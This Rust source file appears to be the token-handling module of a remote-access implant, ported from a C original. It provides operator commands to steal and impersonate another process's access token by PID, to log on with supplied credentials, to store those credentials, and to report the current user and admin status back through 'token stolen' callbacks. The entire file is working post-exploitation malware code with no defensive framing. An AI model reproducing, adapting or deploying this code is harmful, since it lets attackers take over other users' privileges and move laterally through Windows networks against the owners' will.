//! Token stealing (tokens.cpp).

use crate::callback::{post_error_d, post_error_dd, post_error_na, Callback};
use crate::commands::{CALLBACK_TOKEN_GETUID, CALLBACK_TOKEN_STOLEN};

use crate::parse::data_alloc;
use crate::state;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
use windows_sys::Win32::Security::{
    AllocateAndInitializeSid, CheckTokenMembership, FreeSid, DuplicateTokenEx,
    ImpersonateLoggedOnUser, LookupAccountSidA, LogonUserA, RevertToSelf, TokenPrimary, TokenUser,
    GetTokenInformation, TOKEN_ALL_ACCESS, TOKEN_QUERY, TOKEN_USER,
    SecurityDelegation, SID_IDENTIFIER_AUTHORITY, LOGON32_LOGON_NEW_CREDENTIALS,
    LOGON32_PROVIDER_WINNT50,
};
use windows_sys::Win32::System::SystemServices::{
    SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, MAXIMUM_ALLOWED,
};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcess, GetCurrentThread, OpenProcess, OpenProcessToken,
    OpenThreadToken, PROCESS_QUERY_INFORMATION,
};

use parking_lot::Mutex;
use std::sync::OnceLock;

/// Alternate credentials data structure.
#[derive(Default)]
pub struct AltCreds {
    pub domain: Vec<u16>,
    pub user: Vec<u16>,
    pub password: Vec<u16>,
    pub active: bool,
}

static ACREDS: OnceLock<Mutex<AltCreds>> = OnceLock::new();

fn acreds_lock() -> &'static Mutex<AltCreds> {
    ACREDS.get_or_init(|| Mutex::new(AltCreds::default()))
}

pub fn acreds() -> parking_lot::MutexGuard<'static, AltCreds> {
    acreds_lock().lock()
}

/// Make sure we do not make HTTP requests with impersonated tokens.
pub fn token_guard_start() {
    if state::atoken() != 0 {
        unsafe {
            RevertToSelf();
        }
    }
}

pub fn token_guard_start_maybe(ignore_token: bool) {
    if ignore_token {
        token_guard_start();
    }
}

/// Go back to our impersonated token if there is one.
pub fn token_guard_stop() {
    if state::atoken() != 0 {
        unsafe {
            ImpersonateLoggedOnUser(state::atoken() as HANDLE);
        }
    }
}

pub fn token_guard_stop_maybe(ignore_token: bool) {
    if ignore_token {
        token_guard_stop();
    }
}

/// Drop the impersonated token.
pub fn command_rev2self() {
    // make the stored token NULL as well
    if state::atoken() != 0 {
        unsafe {
            CloseHandle(state::atoken() as HANDLE);
        }
    }
    state::set_atoken(0);
    unsafe {
        RevertToSelf();
    }

    // nuke our alternate creds too
    let mut c = acreds();
    c.domain.clear();
    c.user.clear();
    c.password.clear();
    c.active = false;
}

/// Populate buffer with the USER\whatever of the token.
pub fn token_user(token: isize, buffer: &mut [u8]) -> bool {
    let mut username_only = [0u8; 512];
    let mut domainname_only = [0u8; 512];
    let mut token_user_info = [0u8; 4096];
    let mut domain_length = domainname_only.len() as u32;
    let mut user_length = username_only.len() as u32;
    let mut sid_type: i32 = 0;
    let mut returned_tokinfo_length: u32 = 0;

    buffer.fill(0);

    unsafe {
        if GetTokenInformation(
            token as HANDLE,
            TokenUser,
            token_user_info.as_mut_ptr() as *mut _,
            4096,
            &mut returned_tokinfo_length,
        ) == 0
        {
            return false;
        }

        // TOKEN_USER is at the front of the buffer; SID is a pointer inside it
        let sid = (token_user_info.as_ptr() as *const TOKEN_USER).read().User.Sid;
        if LookupAccountSidA(
            std::ptr::null(),
            sid,
            username_only.as_mut_ptr() as *mut _,
            &mut user_length,
            domainname_only.as_mut_ptr() as *mut _,
            &mut domain_length,
            &mut sid_type,
        ) == 0
        {
            return false;
        }
    }

    let dom = &domainname_only[..domainname_only.iter().position(|&c| c == 0).unwrap_or(512)];
    let usr = &username_only[..username_only.iter().position(|&c| c == 0).unwrap_or(512)];
    let mut s = Vec::with_capacity(dom.len() + 1 + usr.len());
    s.extend_from_slice(dom);
    s.push(b'\\');
    s.extend_from_slice(usr);
    let n = s.len().min(buffer.len().saturating_sub(1));
    buffer[..n].copy_from_slice(&s[..n]);
    buffer[buffer.len().saturating_sub(1)] = 0;
    true
}

fn token_output(token: isize, callback: Callback) {
    let mut name = [0u8; 512];
    if token_user(token, &mut name) {
        let namelen = name.iter().position(|&c| c == 0).unwrap_or(512);
        let mut result = Vec::new();
        if is_admin() {
            result.extend_from_slice(&name[..namelen]);
            result.extend_from_slice(b" (admin)");
        } else {
            result.extend_from_slice(&name[..namelen]);
        }
        callback(&result, result.len() as i32, CALLBACK_TOKEN_GETUID);
    }
}

/// Get UID of a user.
pub fn command_getuid(_buffer: &[u8], _length: usize, callback: Callback) {
    let mut token: HANDLE = std::ptr::null_mut();
    unsafe {
        if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, 0, &mut token) != 0 {
            token_output(token as isize, callback);
            CloseHandle(token);
        } else if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) != 0 {
            token_output(token as isize, callback);
            CloseHandle(token);
        } else if state::atoken() != 0 {
            token_guard_start();
            token_output(state::atoken(), callback);
            token_guard_stop();
        } else {
            post_error_na(0x1);
        }
    }
}

/// Steal a token.
pub fn command_steal_token(buffer: &[u8], length: usize, callback: Callback) {
    let mut token: HANDLE = std::ptr::null_mut();
    let mut handle: HANDLE = std::ptr::null_mut();
    let mut name = [0u8; 512];

    // extract pid from buffer
    if length != 4 {
        return;
    }
    let pid = u32::from_be_bytes([buffer[0], buffer[1], buffer[2], buffer[3]]);

    unsafe {
        // obtain a handle to the process we want
        handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
        if handle.is_null() {
            post_error_dd(0x21, pid as i32, GetLastError() as i32);
            return;
        }

        // try to grab that process's token
        if OpenProcessToken(handle, TOKEN_ALL_ACCESS, &mut token) == 0 {
            post_error_dd(0x24, pid as i32, GetLastError() as i32);
            return;
        }

        // drop our old token
        command_rev2self();

        // try to steal the token
        if ImpersonateLoggedOnUser(token) == 0 {
            post_error_dd(0x25, pid as i32, GetLastError() as i32);
            return;
        }

        // duplicate the token into atoken
        let mut atoken: HANDLE = std::ptr::null_mut();
        if DuplicateTokenEx(token, MAXIMUM_ALLOWED, std::ptr::null(), SecurityDelegation, TokenPrimary, &mut atoken) == 0 {
            post_error_dd(0x26, pid as i32, GetLastError() as i32);
            return;
        }
        state::set_atoken(atoken as isize);

        // impersonate again with the duplicated token
        if ImpersonateLoggedOnUser(atoken) == 0 {
            post_error_dd(0x27, pid as i32, GetLastError() as i32);
            return;
        }

        if !handle.is_null() {
            CloseHandle(handle);
        }
        if !token.is_null() {
            CloseHandle(token);
        }

        if token_user(state::atoken(), &mut name) {
            let namelen = name.iter().position(|&c| c == 0).unwrap_or(512);
            callback(&name[..namelen], namelen as i32, CALLBACK_TOKEN_STOLEN);
        }
    }
}

/// Create a token with credentials.
pub fn logintoken(domain: &[u8], user: &[u8], pass: &[u8], callback: Callback) {
    // drop the current token and clean it up
    command_rev2self();

    let domain_c = cstr(domain);
    let user_c = cstr(user);
    let pass_c = cstr(pass);

    unsafe {
        let mut atoken: HANDLE = std::ptr::null_mut();
        if LogonUserA(
            user_c.as_ptr() as *const _,
            domain_c.as_ptr() as *const _,
            pass_c.as_ptr() as *const _,
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_WINNT50,
            &mut atoken,
        ) == 0
        {
            post_error_d(0x18, GetLastError() as i32);
            return;
        }
        state::set_atoken(atoken as isize);

        if ImpersonateLoggedOnUser(atoken) == 0 {
            post_error_d(0x19, GetLastError() as i32);
            return;
        }
    }

    // allocate our alternate credentials
    let mut c = acreds();
    c.domain = decode_utf16(domain);
    c.user = decode_utf16(user);
    c.password = decode_utf16(pass);
    c.active = true;

    // let the user know
    let mut name = [0u8; 1024];
    if token_user(state::atoken(), &mut name) {
        let namelen = name.iter().position(|&c| c == 0).unwrap_or(1024);
        callback(&name[..namelen], namelen as i32, CALLBACK_TOKEN_STOLEN);
    }
}

/// Create a token with credentials... k thx.
pub fn command_loginuser(buffer: &[u8], length: usize, callback: Callback) {
    let mut blob = data_alloc(1024 * 3);
    let mut domain = vec![0u8; 1024];
    let mut user = vec![0u8; 1024];
    let mut pass = vec![0u8; 1024];

    let mut parser = crate::parse::DataP::init(&mut buffer.to_vec());
    if parser.data_string(&mut domain, 1024) == 0
        || parser.data_string(&mut user, 1024) == 0
        || parser.data_string(&mut pass, 1024) == 0
    {
        blob.cleanup();
        return;
    }

    let dlen = domain.iter().position(|&c| c == 0).unwrap_or(1024);
    let ulen = user.iter().position(|&c| c == 0).unwrap_or(1024);
    let plen = pass.iter().position(|&c| c == 0).unwrap_or(1024);
    logintoken(&domain[..dlen], &user[..ulen], &pass[..plen], callback);

    blob.cleanup();
}

/// Check if the current user is an administrator or not.
pub fn is_admin() -> bool {
    unsafe {
        let mut nt_authority = SID_IDENTIFIER_AUTHORITY {
            Value: [0, 0, 0, 0, 0, 5], // SECURITY_NT_AUTHORITY
        };
        let mut administrators_group: *mut core::ffi::c_void = std::ptr::null_mut();
        let b = AllocateAndInitializeSid(
            &mut nt_authority,
            2,
            SECURITY_BUILTIN_DOMAIN_RID as u32,
            DOMAIN_ALIAS_RID_ADMINS as u32,
            0,
            0,
            0,
            0,
            0,
            0,
            &mut administrators_group,
        );
        if b != 0 {
            let mut result: i32 = 1;
            if CheckTokenMembership(std::ptr::null_mut(), administrators_group, &mut result) == 0 {
                result = 0;
            }
            FreeSid(administrators_group);
            result != 0
        } else {
            false
        }
    }
}

/// Use a token.
pub fn use_token(token: isize, name: &mut [u8], nlen: usize) -> bool {
    // drop our old token
    command_rev2self();

    unsafe {
        // try to steal the token
        if ImpersonateLoggedOnUser(token as HANDLE) == 0 {
            return false;
        }
        // duplicate the token into atoken
        let mut atoken: HANDLE = std::ptr::null_mut();
        if DuplicateTokenEx(token as HANDLE, MAXIMUM_ALLOWED, std::ptr::null(), SecurityDelegation, TokenPrimary, &mut atoken) == 0 {
            return false;
        }
        state::set_atoken(atoken as isize);
        if ImpersonateLoggedOnUser(atoken) == 0 {
            return false;
        }
    }

    if !token_user(state::atoken(), name) {
        return false;
    }
    let namelen = name.iter().position(|&c| c == 0).unwrap_or(nlen);
    crate::callback::command_shell_callback(&name[..namelen], namelen as i32, CALLBACK_TOKEN_STOLEN);
    true
}

fn decode_utf16(s: &[u8]) -> Vec<u16> {
    String::from_utf8_lossy(s).encode_utf16().collect()
}

fn cstr(s: &[u8]) -> Vec<u8> {
    let mut v = s.to_vec();
    if !v.ends_with(&[0]) {
        v.push(0);
    }
    v
}
